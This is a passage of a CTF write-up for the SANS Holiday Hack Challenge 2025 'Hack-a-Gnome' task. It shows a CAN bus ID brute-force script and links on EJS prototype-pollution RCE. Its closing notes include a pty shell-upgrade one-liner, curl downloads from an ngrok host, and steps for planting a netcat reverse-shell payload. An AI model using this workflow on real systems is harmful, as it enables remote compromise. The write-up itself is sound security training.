</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;HIT id=0x</span><span style="color:#e6db74">{</span>arb_id<span style="color:#e6db74">:</span><span style="color:#e6db74">03X</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> data=</span><span style="color:#e6db74">{</span>data<span style="color:#f92672">.</span>hex() <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;(empty)&#39;</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> RPM </span><span style="color:#e6db74">{</span>before<span style="color:#e6db74">}</span><span style="color:#e6db74">-&gt;</span><span style="color:#e6db74">{</span>after<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>                hits<span style="color:#f92672">.</span>append((arb_id, data, before, after))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            time<span style="color:#f92672">.</span>sleep(rate_sleep)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> hits
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    bus <span style="color:#f92672">=</span> can<span style="color:#f92672">.</span>interface<span style="color:#f92672">.</span>Bus(channel<span style="color:#f92672">=</span>IFACE, interface<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;socketcan&#34;</span>, receive_own_messages<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payloads <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>,         <span style="color:#75715e"># empty</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xFF</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x14\x14</span><span style="color:#e6db74">&#34;</span>, <span style="color:#75715e"># +20,+20</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xEC\xEC</span><span style="color:#e6db74">&#34;</span>, <span style="color:#75715e"># -20,-20</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xEC\x14</span><span style="color:#e6db74">&#34;</span>, <span style="color:#75715e"># left -, right +</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x14\xEC</span><span style="color:#e6db74">&#34;</span>, <span style="color:#75715e"># left +, right -</span>
</span></span><span style="display:flex;"><span>    ]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Scanning standard IDs 0x</span><span style="color:#e6db74">{</span>SCAN_START<span style="color:#e6db74">:</span><span style="color:#e6db74">03X</span><span style="color:#e6db74">}</span><span style="color:#e6db74">-0x</span><span style="color:#e6db74">{</span>SCAN_END<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">:</span><span style="color:#e6db74">03X</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> ...&#34;</span>)
</span></span><span style="display:flex;"><span>    hits <span style="color:#f92672">=</span> scan(
</span></span><span style="display:flex;"><span>        bus,
</span></span><span style="display:flex;"><span>        start<span style="color:#f92672">=</span>SCAN_START,
</span></span><span style="display:flex;"><span>        end<span style="color:#f92672">=</span>SCAN_END,
</span></span><span style="display:flex;"><span>        payloads<span style="color:#f92672">=</span>payloads,
</span></span><span style="display:flex;"><span>        extended<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>        rate_sleep<span style="color:#f92672">=</span><span style="color:#ae81ff">0.03</span>,
</span></span><span style="display:flex;"><span>        verbose_every<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>,   <span style="color:#75715e"># set to e.g. 10 if too chatty</span>
</span></span><span style="display:flex;"><span>    )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Done. Hits: </span><span style="color:#e6db74">{</span>len(hits)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> arb_id, data, before, after <span style="color:#f92672">in</span> hits[:<span style="color:#ae81ff">50</span>]:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;  0x</span><span style="color:#e6db74">{</span>arb_id<span style="color:#e6db74">:</span><span style="color:#e6db74">03X</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>data<span style="color:#f92672">.</span>hex() <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;(empty)&#39;</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>before<span style="color:#e6db74">}</span><span style="color:#e6db74">-&gt;</span><span style="color:#e6db74">{</span>after<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    bus<span style="color:#f92672">.</span>shutdown()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    main()</span></span></code></pre></div>
<p>After toying with the input to the Python script on the server, we finally mapped the new HEX values like this:</p>
<table>
  <thead>
      <tr>
          <th>Button</th>
          <th>Canbus command id</th>
          <th>New Value</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>w</td>
          <td>0x656</td>
          <td>0x201</td>
      </tr>
      <tr>
          <td>a</td>
          <td>0x658</td>
          <td>0x203</td>
      </tr>
      <tr>
          <td>s</td>
          <td>0x657</td>
          <td>0x202</td>
      </tr>
      <tr>
          <td>d</td>
          <td>0x659</td>
          <td>0x204</td>
      </tr>
  </tbody>
</table>
<p>We grabbed the Python script from the server to our attacking machine, edited it according to the mapping and reuploaded it under a new name (<em>cb.py</em>). This enabled us to navigate our robot through the maze using this command and directions:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0"><code>python3 cb.py &lt;direction&gt;</code></pre></div>
<p>Leading us to solving the objective:</p>
<p><a href="#R-image-6a52e251f1046ad272c3b06eea26e58e" class="lightbox-link"><img alt="Final screen" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-5.png" style="height: auto;width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-6a52e251f1046ad272c3b06eea26e58e"><img alt="Final screen" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-5.png"></a></p>
<h2 id="resources">Resources</h2>
<p>This objective required extensive reading up on the whole <code>__proto__</code> attack vector. We found these resources of great value for our research:</p>
<ul>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-EJS-2803307" rel="external">https://security.snyk.io/vuln/SNYK-JS-EJS-2803307</a></li>
<li><a href="https://blog.themikkel.dk/ddc-regionale-2025-writeup/" rel="external">https://blog.themikkel.dk/ddc-regionale-2025-writeup/</a></li>
<li><a href="https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/" rel="external">https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/</a></li>
<li><a href="https://www.nodejs-security.com/blog/understanding-and-preventing-prototype-pollution-in-nodejs" rel="external">https://www.nodejs-security.com/blog/understanding-and-preventing-prototype-pollution-in-nodejs</a></li>
<li><a href="https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce" rel="external">https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce</a></li>
<li><a href="https://dev.to/boiledsteak/simple-remote-code-execution-on-ejs-web-applications-with-express-fileupload-3325" rel="external">https://dev.to/boiledsteak/simple-remote-code-execution-on-ejs-web-applications-with-express-fileupload-3325</a></li>
<li><a href="https://medium.com/@albertoc_91016/prototype-pollution-in-open-source-libraries-exploiting-rce-in-ejs-ae93016630a3" rel="external">https://medium.com/@albertoc_91016/prototype-pollution-in-open-source-libraries-exploiting-rce-in-ejs-ae93016630a3</a></li>
<li><a href="https://ejs.co/#docs" rel="external">https://ejs.co/#docs</a></li>
</ul>
<h2 id="chris-davis-mission-debrief">Chris Davis mission debrief</h2>
<blockquote>
<p>Excellent work! You&rsquo;ve successfully taken control of the gnome - look at that interface responding to our commands now.</p>
<p>Time to turn this little rebel against its own manufacturing operation and shut them down for good!</p>
</blockquote>
<h3 id="hints">Hints</h3>
<table>
  <thead>
      <tr>
          <th>Hint</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Sometimes, client-side code can interfere with what you submit. Try proxying your requests through a tool like Burp Suite or OWASP ZAP. You might be able to trigger a revealing error message.</td>
      </tr>
      <tr>
          <td>I actually helped design the software that controls the factory back when we used it to make toys. It&rsquo;s quite complex. After logging in, there is a front-end that proxies requests to two main components: a backend Statistics page, which uses a per-gnome container to render a template with your gnome&rsquo;s stats, and the UI, which connects to the camera feed and sends control signals to the factory, relaying them to your gnome (assuming the CAN bus controls are hooked up correctly). Be careful, the gnomes shutdown if you logout and also shutdown if they run out of their 2-hour battery life (which means you&rsquo;d have to start all over again).</td>
      </tr>
      <tr>
          <td>There might be a way to check if an attribute IS_DEFINED on a given entry. This could allow you to brute-force possible attribute names for the target user&rsquo;s entry, which stores their password hash. Depending on the hash type, it might already be cracked and available online where you could find an online cracking station to break it.</td>
      </tr>
      <tr>
          <td>Once you determine the type of database the gnome control factory&rsquo;s login is using, look up its documentation on default document types and properties. This information could help you generate a list of common English first names to try in your attack.</td>
      </tr>
      <tr>
          <td>Oh no, it sounds like the CAN bus controls are not sending the correct signals! If only there was a way to hack into your gnome&rsquo;s control stats/signal container to get command-line access to the smart-gnome. This would allow you to fix the signals and control the bot to shut down the factory. During my development of the robotic prototype, we found the factory&rsquo;s pollution to be undesirable, which is why we shut it down. If not updated since then, the gnome might be running on old and outdated packages.</td>
      </tr>
      <tr>
          <td>Nice! Once you have command-line access to the gnome, you&rsquo;ll need to fix the signals in the canbus_client.py file so they match up correctly. After that, the signals you send through the web UI to the factory should properly control the smart-gnome. You could try sniffing CAN bus traffic, enumerating signals based on any documentation you find, or brute-forcing combinations until you discover the right signals to control the gnome from the web UI.</td>
      </tr>
  </tbody>
</table>
<p>python3 -c &lsquo;import pty;pty.spawn(&quot;/bin/bash&quot;)&rsquo;</p>
<p>Remember to refresh the main page for the reverse shell to work!!!</p>
<p>NOTE: SOLVE THIS USING EDGE!!!!</p>
<p>curl -o test.py  <a href="https://scarabaeiform-prolixly-odin.ngrok-free.dev/test.sh" rel="external">https://scarabaeiform-prolixly-odin.ngrok-free.dev/test.sh</a>
curl -o cb.py  <a href="https://scarabaeiform-prolixly-odin.ngrok-free.dev/cb.py" rel="external">https://scarabaeiform-prolixly-odin.ngrok-free.dev/cb.py</a></p>
<p>General workflow from start to finish:</p>
<ol>
<li>In the webapp, inspect all endpoint</li>
<li>Find the endpoint where you can set data</li>
<li>Provoke error messages to find the rendering engine (EJS)</li>
<li>See if it is possible to set <strong>proto</strong></li>
</ol>
<p>Enabling shell
5. On endpoint set client = 1
6. On endpoint set debug = 1
7. Set up NGROK netcat reverse
8. Plant payload for reverse shell using the NGROK address and port
9. Refresh main page</p>
<p>In spawned shell:
10. Privilege escalate using python to get a fancy bash shell
11. Inspect canbus_client.py
12. Inspect README.md</p>
<p>Identifying missing HEX code
13. Set up NGROK web frontend
14. Spin up Python webserver
15. Serve HEX bruteforce python script
16. Run bruteforce script whilst observing if the robot moves</p>

  <footer class="footline">
              <i class='fa-fw fas fa-calendar'></i> Nov 30, 2025
  </footer>
</article>
        </div>
      </main>
    </div>
    <aside id="R-sidebar" class="default-animation">
      <div id="R-header-topbar" class="default-animation"></div>
      <div id="R-header-wrapper" class="default-animation">
        <div id="R-header" class="default-animation">
          <a id="R-logo" class="R-default" href="/index.html">
            <div class="logo-title">SANS Holiday Hack Challenge 2025</div>
          </a>
        </div>
        <search><form action="/search/index.html" method="get">
          <div class="searchbox default-animation">
            <button class="search-detail" type="submit" title="Search (CTRL+ALT+f)"><i class="fas fa-search"></i></button>
            <label class="a11y-only" for="R-search-by">Search</label>
            <input data-search-input id="R-search-by" name="search-by" class="search-by" type="search" placeholder="Search...">
            <button class="search-clear" type="button" data-search-clear="" title="Clear search"><i class="fas fa-times" title="Clear search"></i></button>
          </div>
        </form></search>
      </div>
      <div id="R-homelinks" class="default-animation homelinks">
        <div class="R-menu-divider default-animation">
          <hr class="padding">
        </div>
        <div class="R-sidebarmenu R-shortcutmenu-homelinks">
          <ul class="space collapsible-menu">
            <li class="" data-nav-url="/index.html"><a class="padding" href="/index.html"><i class="fa-fw fas fa-home"></i> Home</a></li>
          </ul>
        </div>
        <div class="R-menu-divider default-animation">
          <hr class="padding">
        </div>
        <div class="R-sidebarmenu R-shortcutmenu-headercontrols">
          <ul class="">
          </ul>
        </div>
        <div class="R-menu-divider default-animation">
          <hr class="padding">
        </div>
      </div>
      <div id="R-content-wrapper" class="highlightable">
        <div class="R-sidebarmenu R-shortcutmenu-main">
          <ul class="enlarge morespace collapsible-menu">
            <li class="" data-nav-url="/act1/index.html"><a class="padding" href="/act1/index.html">Act 1</a><ul id="R-subsections-8dc0c36ceefa45529ff4cf1f9bdc1f66" class="collapsible-menu"></ul></li>
            <li class="" data-nav-url="/act2/index.html"><a class="padding" href="/act2/index.html">Act 2</a><ul id="R-subsections-9d3d8c898368693a495088de36411fa6" class="collapsible-menu"></ul></li>
            <li class="parent " data-nav-url="/act3/index.html"><a class="padding" href="/act3/index.html">Act 3</a><ul id="R-subsections-0b6215c9fad834351813cc2ad0d4a335" class="collapsible-menu">
            <li class="" data-nav-url="/act3/gnome-tea/index.html"><a class="padding" href="/act3/gnome-tea/index.html">Gnome Tea</a></li>
            <li class="parent alwaysopen " data-nav-url="/act3/hack-a-gnome/index.html"><a class="padding" href="/act3/hack-a-gnome/index.html">Hack-a-Gnome</a><ul id="R-subsections-991a0423adce9b8f718a932ac4ec9bfc" class="collapsible-menu">
            <li class="active " data-nav-url="/act3/hack-a-gnome/_index-copy/index.html"><a class="padding" href="/act3/hack-a-gnome/_index-copy/index.html">Hack-a-Gnome</a></li></ul></li>
            <li class="" data-nav-url="/act3/snowcat-rce-and-priv-esc/index.html"><a class="padding" href="/act3/snowcat-rce-and-priv-esc/index.html">Snowcat RCE &amp; Priv Esc</a></li>
            <li class="" data-nav-url="/act3/schrodingers-scope/index.html"><a class="padding" href="/act3/schrodingers-scope/index.html">SchrÃ¶dingers Scope</a></li>
            <li class="" data-nav-url="/act3/find-and-shutdown-frostys-snowglobe-machine/index.html"><a class="padding" href="/act3/find-and-shutdown-frostys-snowglobe-machine/index.html">Find and Shutdown Frostys Snowglobe Machine</a></li>
            <li class="" data-nav-url="/act3/on-the-wire/index.html"><a class="padding" href="/act3/on-the-wire/index.html">On the Wire</a></li>
            <li class="" data-nav-url="/act3/free-ski/index.html"><a class="padding" href="/act3/free-ski/index.html">Free Ski</a></li></ul></li>
          </ul>
        </div>
        <div class="R-sidebarmenu R-shortcutmenu-shortcuts">
          <ul class="space collapsible-menu">
          </ul>
        </div>
        <div id="R-footer-margin"></div>
        <div class="R-menu-divider default-animation">
          <hr class="padding">
        </div>
        <div class="R-sidebarmenu R-shortcutmenu-footercontrols">
          <ul class="">
          </ul>
        </div>
<div id="R-footer"><p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p></div>
      </div>
    </aside>
    <script src="/js/js-yaml/js-yaml.min.js?1765551805" defer></script>
    <script src="/js/d3/d3-color.min.js?1765551805" defer></script>
    <script src="/js/d3/d3-dispatch.min.js?1765551805" defer></script>
    <script src="/js/d3/d3-drag.min.js?1765551805" defer></script>
    <script src="/js/d3/d3-ease.min.js?1765551805" defer></script>
    <script src="/js/d3/d3-interpolate.min.js?1765551805" defer></script>
    <script src="/js/d3/d3-selection.min.js?1765551805" defer></script>
    <script src="/js/d3/d3-timer.min.js?1765551805" defer></script>
    <script src="/js/d3/d3-transition.min.js?1765551805" defer></script>
    <script src="/js/d3/d3-zoom.min.js?1765551805" defer></script>
    <script src="/js/mermaid/mermaid.min.js?1765551805" defer></script>
    <script>
      window.relearn.themeUseMermaid = JSON.parse("{}");
    </script>
    <script src="/js/clipboard/clipboard.min.js?1765551805" defer></script>
    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1765551805" defer></script>
    <script src="/js/theme.js?1765551805" defer></script>
  </body>
</html>
